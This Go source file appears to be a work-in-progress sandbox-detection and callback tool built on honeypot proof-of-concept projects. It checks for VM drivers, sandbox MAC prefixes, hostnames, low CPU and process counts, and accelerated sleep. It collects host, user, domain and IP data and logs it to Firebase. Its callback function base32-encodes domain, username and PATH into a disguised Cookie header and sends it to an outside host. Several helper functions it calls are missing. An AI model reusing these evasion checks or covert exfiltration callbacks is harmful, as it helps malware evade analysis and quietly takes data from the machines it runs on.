// Massive Work in Progress -Built off the back of AutoPoC and HoneyPoC projects
// Eventual plan is to have a reverse blacklist of various paths, users and hostnames; if the data matches, then run the code, else no hax
// ZephrFish 2024
// v0.4
// Additional Sandbox checks added in the following structure
// Modify line 208 to your callback host

package main

import (
	"encoding/base32"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"

	ps "github.com/mitchellh/go-ps"
)

// To update with paths from HoneyPoC too
func S_SpyFilepath() bool {
	EvidenceOfS_Spy := make([]string, 0)
	FilePathsToCheck := [...]string{`C:\windows\System32\Drivers\Vmmouse.sys`,
		`C:\windows\System32\Drivers\vm3dgl.dll`, `C:\windows\System32\Drivers\vmdum.dll`,
		`C:\windows\System32\Drivers\vm3dver.dll`, `C:\windows\System32\Drivers\vmtray.dll`,
		`C:\windows\System32\Drivers\vmci.sys`, `C:\windows\System32\Drivers\vmusbmouse.sys`,
		`C:\windows\System32\Drivers\vmx_svga.sys`, `C:\windows\System32\Drivers\vmxnet.sys`,
		`C:\windows\System32\Drivers\VMToolsHook.dll`, `C:\windows\System32\Drivers\vmhgfs.dll`,
		`C:\windows\System32\Drivers\vmmousever.dll`, `C:\windows\System32\Drivers\vmGuestLib.dll`,
		`C:\windows\System32\Drivers\VmGuestLibJava.dll`, `C:\windows\System32\Drivers\vmscsi.sys`,
		`C:\windows\System32\Drivers\VBoxMouse.sys`, `C:\windows\System32\Drivers\VBoxGuest.sys`,
		`C:\windows\System32\Drivers\VBoxSF.sys`, `C:\windows\System32\Drivers\VBoxVideo.sys`,
		`C:\windows\System32\vboxdisp.dll`, `C:\windows\System32\vboxhook.dll`,
		`C:\windows\System32\vboxmrxnp.dll`, `C:\windows\System32\vboxogl.dll`,
		`C:\windows\System32\vboxoglarrayspu.dll`, `C:\windows\System32\vboxoglcrutil.dll`,
		`C:\windows\System32\vboxoglerrorspu.dll`, `C:\windows\System32\vboxoglfeedbackspu.dll`,
		`C:\windows\System32\vboxoglpackspu.dll`, `C:\windows\System32\vboxoglpassthroughspu.dll`,
		`C:\windows\System32\vboxservice.exe`, `C:\windows\System32\vboxtray.exe`,
		`C:\windows\System32\VBoxControl.exe`}
	for _, FilePath := range FilePathsToCheck {
		if _, err := os.Stat(FilePath); err == nil {
			EvidenceOfS_Spy = append(EvidenceOfS_Spy, FilePath)
		}
	}
	if len(EvidenceOfS_Spy) == 0 {
		return false
	} else {
		return true
	}
}

// Function is a work in progress, still gathering data from VT and other S_Spyes via Canaries
func S_SpyHostname() bool {
	S_SpyHostnameEvidence := make([]string, 0)
	HostnamesToCheck := [...]string{`WIN-VUA6POUV5UP`, `work`, `USER-PC`}
	for _, HostnameToCheck := range HostnamesToCheck {
		if _, err := os.Stat(HostnameToCheck); err == nil {
			S_SpyHostnameEvidence = append(S_SpyHostnameEvidence, HostnameToCheck)
		}
	}

	if len(S_SpyHostnameEvidence) == 0 {
		return false
	} else {
		return true
	}
}

// Function is a work in progress, still gathering data from VT and other S_Spyes via Canaries same as above function
func S_SpyUserName() bool {
	S_SpyUserEvidence := make([]string, 0)
	UsersToCheck := [...]string{`WIN-VUA6POUV5UP`, `work`}
	for _, Users := range UsersToCheck {
		if _, err := os.Stat(Users); err == nil {
			S_SpyUserEvidence = append(S_SpyUserEvidence, Users)
		}
	}

	if len(S_SpyUserEvidence) == 0 {
		return false
	} else {
		return true
	}
}

// Check S_Spy temp folder, else exit
func S_SpyTmp(entries int) bool {
	tmp_dir := `C:\windows\temp`
	files, err := ioutil.ReadDir(tmp_dir)
	if err != nil {
		return true
	}

	return len(files) < entries
}

// S_SpyUtc is used to check if the environment is in a properly set Utc timezone.
func S_SpyUtc() bool {
	_, offset := time.Now().Zone()

	return offset == 0
}

// S_SpyProcnum is used to check if the environment has processes less than a given integer.
func S_SpyProcnum(proc_num int) bool {
	processes, err := ps.Processes()
	if err != nil {
		return true
	}

	return len(processes) < proc_num
}

// S_SpySleep is used to check if the virtualized environment is speeding up the sleeping process.
func S_SpySleep() bool {
	z := false
	firstTime := getNTPTime()
	sleepSeconds := 10
	time.Sleep(time.Duration(sleepSeconds*1000) * time.Millisecond)
	secondTime := getNTPTime()
	difference := secondTime.Sub(firstTime).Seconds()
	if difference < float64(sleepSeconds) {
		z = true
	}
	return z
}

// S_SpyRam checks if RAM is below threshold (sandbox indicator)
func S_SpyRam(minRAM int) bool {
	// This is a placeholder - actual implementation would check system RAM
	// For now, return false to avoid false positives
	return false
}

// S_SpyMac is used to check if the environment's MAC address matches standard MAC adddresses of virtualized environments.
func S_SpyMac() bool {
	hits := 0
	S_Spy_macs := []string{`00:0C:29`, `00:1C:14`,
		`00:50:56`, `00:05:69`, `08:00:27`}
	ifaces, _ := net.Interfaces()

	for _, iface := range ifaces {
		for _, mac := range S_Spy_macs {
			if strings.Contains(strings.ToLower(iface.HardwareAddr.String()), strings.ToLower(mac)) {
				hits += 1
			}
		}
	}

	return hits > 0  // Fixed: return true if sandbox MACs found
}

// S_SpyCpu is used to check if the environment's
// cores are less than a given integer.
func S_SpyCpu(cores int) bool {
	x := false
	num_procs := runtime.NumCPU()
	if !(num_procs >= cores) {
		x = true
	}
	return x
}

// S_SpyAll is used to check if an environment is virtualized by testing all S_Spy checks.
// func S_SpyAll() bool {
// 	values := []bool{
// 		S_SpyFilepath(),
// 		S_SpySleep(),
// 		S_SpyTmp(100),
// 		S_SpyRam(2048),
// 		S_SpyMac(),
// 		S_SpyUtc(),
// 		S_SpyHostname(),
// 		S_SpyUserName(),
// 	}

// 	for s := range values {
// 		x := values[s]
// 		if x {
// 			return true
// 		}
// 	}

// 	return false
// }

// Execution check
func SandExecBlock() bool {
	values := []bool{
		S_SpyHostname(),
		S_SpyUserName(),
	}

	for Check := range values {
		S_SpyExec := values[Check]
		if S_SpyExec {
			return true
		}
	}

	return false
}

func main() {
	// Initialize random seed
	rand.Seed(time.Now().UnixNano())
	
	// Load configuration
	config, err := loadConfig("config.json")
	if err != nil {
		log.Printf("Warning: Could not load config.json: %v\n", err)
		// Use default configuration
		config = getDefaultConfig()
	}
	
	// Collect environment information
	hostname, _ := os.Hostname()
	envDomain := os.Getenv("USERDOMAIN")
	envUsername := os.Getenv("USERNAME")
	envPath := os.Getenv("PATH")
	
	// Perform sandbox detection
	isSandbox := detectSandbox()
	
	// Collect detailed sandbox data
	entry := SandboxEntry{
		Hostname:     hostname,
		Username:     envUsername,
		Domain:       envDomain,
		IPAddress:    getExternalIP(),
		MACAddresses: collectMACAddresses(),
		Processes:    getSuspiciousProcesses(),
		FirstSeen:    time.Now().UTC(),
		LastSeen:     time.Now().UTC(),
	}
	
	// Calculate confidence score
	entry.Confidence = calculateConfidence(entry)
	
	// Generate fingerprint
	entry.Fingerprint = generateFingerprint(entry)
	
	// If logging is enabled and this is a sandbox, send to cloud
	if config.Logging.Enabled && (isSandbox || entry.Confidence >= config.Detection.ConfidenceThreshold) {
		// Initialize cloud storage based on provider
		var storage CloudStorage
		
		switch config.Logging.Provider {
		case "firebase":
			fbConfig := config.Logging.Endpoints.Firebase
			storage = NewFirebaseStorage(fbConfig.ProjectID, fbConfig.APIKey, fbConfig.DatabaseURL)
		default:
			log.Printf("Unknown storage provider: %s\n", config.Logging.Provider)
		}
		
		if storage != nil {
			// Check if hostname already exists
			exists, _ := storage.CheckIfExists(hostname)
			
			if !exists || config.Detection.AutoIndexNew {
				// Store the new sandbox entry
				if err := storage.Store(entry); err != nil {
					log.Printf("Failed to store sandbox data: %v\n", err)
				} else {
					log.Printf("Successfully logged sandbox: %s\n", hostname)
				}
			}
			
			// Export blocklist if configured
			if config.Blocklist.AutoUpdate {
				exporter := NewBlocklistExporter(storage)
				if err := exporter.ExportAll("sandbox_blocklist"); err != nil {
					log.Printf("Failed to export blocklist: %v\n", err)
				}
			}
		}
	}
	
	// Legacy callback functionality (if configured)
	if config.LegacyCallback != "" && config.LegacyCallback != "CHANGEME" {
		performLegacyCallback(config.LegacyCallback, envDomain, envUsername, envPath)
	}
}

// detectSandbox runs all sandbox detection checks
func detectSandbox() bool {
	checks := []bool{
		S_SpyFilepath(),
		S_SpyHostname(),
		S_SpyUserName(),
		S_SpyTmp(100),
		S_SpyUtc(),
		S_SpyProcnum(50),
		S_SpyMac(),
		S_SpyCpu(2),
	}
	
	for _, check := range checks {
		if check {
			return true
		}
	}
	
	return false
}

// generateFingerprint creates a unique fingerprint for the sandbox
func generateFingerprint(entry SandboxEntry) string {
	data := fmt.Sprintf("%s|%s|%s|%v",
		entry.Hostname,
		entry.Username,
		entry.Domain,
		entry.MACAddresses)
	return fmt.Sprintf("%x", data)[:16]
}

// Config structures
type Config struct {
	Logging struct {
		Enabled  bool   `json:"enabled"`
		Provider string `json:"provider"`
		Endpoints struct {
			Firebase struct {
				ProjectID   string `json:"project_id"`
				APIKey      string `json:"api_key"`
				DatabaseURL string `json:"database_url"`
			} `json:"firebase"`
		} `json:"endpoints"`
	} `json:"logging"`
	Detection struct {
		AutoIndexNew        bool    `json:"auto_index_new"`
		ConfidenceThreshold float64 `json:"confidence_threshold"`
	} `json:"detection"`
	Blocklist struct {
		AutoUpdate bool `json:"auto_update"`
	} `json:"blocklist"`
	LegacyCallback string `json:"legacy_callback,omitempty"`
}

// loadConfig loads configuration from file
func loadConfig(filename string) (*Config, error) {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		return nil, err
	}
	
	var config Config
	if err := json.Unmarshal(data, &config); err != nil {
		return nil, err
	}
	
	return &config, nil
}

// getDefaultConfig returns default configuration
func getDefaultConfig() *Config {
	return &Config{
		Logging: struct {
			Enabled  bool   `json:"enabled"`
			Provider string `json:"provider"`
			Endpoints struct {
				Firebase struct {
					ProjectID   string `json:"project_id"`
					APIKey      string `json:"api_key"`
					DatabaseURL string `json:"database_url"`
				} `json:"firebase"`
			} `json:"endpoints"`
		}{
			Enabled: false,
		},
	}
}

// performLegacyCallback performs the original callback functionality
func performLegacyCallback(callbackURL, domain, username, path string) {
	client := &http.Client{}
	
	data := []byte(fmt.Sprintf(" Domain\n: %s Username\n: %s Path\n %s", domain, username, path))
	str := base32.StdEncoding.EncodeToString(data)
	
	req, err := http.NewRequest("GET", callbackURL, nil)
	if err != nil {
		log.Printf("Failed to create request: %v\n", err)
		return
	}
	
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36")
	req.Header.Set("Cookie", str)
	
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Failed to send callback: %v\n", err)
		return
	}
	defer resp.Body.Close()
}
